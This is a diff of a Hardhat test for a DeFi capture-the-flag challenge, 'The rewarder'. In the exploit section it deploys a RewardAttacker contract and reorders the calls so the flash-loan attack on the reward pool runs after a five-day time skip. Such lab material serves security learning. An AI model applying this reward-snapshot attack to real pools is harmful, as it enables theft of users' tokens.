@@ -45,7 +45,6 @@ describe('[Challenge] The rewarder', function () {
 
         // Advance time 5 days so that depositors can get rewards
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
-        
         // Each depositor gets 25 reward tokens
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
@@ -68,14 +67,11 @@ describe('[Challenge] The rewarder', function () {
         /** CODE YOUR EXPLOIT HERE */
         const rewardAttackerFactory = await ethers.getContractFactory("RewardAttacker", attacker);
         this.rewardAttacker = await rewardAttackerFactory.deploy(
-            this.flashLoanPool.address,
-            this.rewarderPool.address,
-            this.liquidityToken.address
+            this.flashLoanPool.address, this.rewarderPool.address,this.liquidityToken.address, this.rewardToken.address
             );
         let tokenInPool = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
-        console.log("token in pool :", tokenInPool);
-        await this.rewardAttacker.attackRewardPool(tokenInPool);
         await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await this.rewardAttacker.attackRewardPool(tokenInPool);
     });
 
     after(async function () {
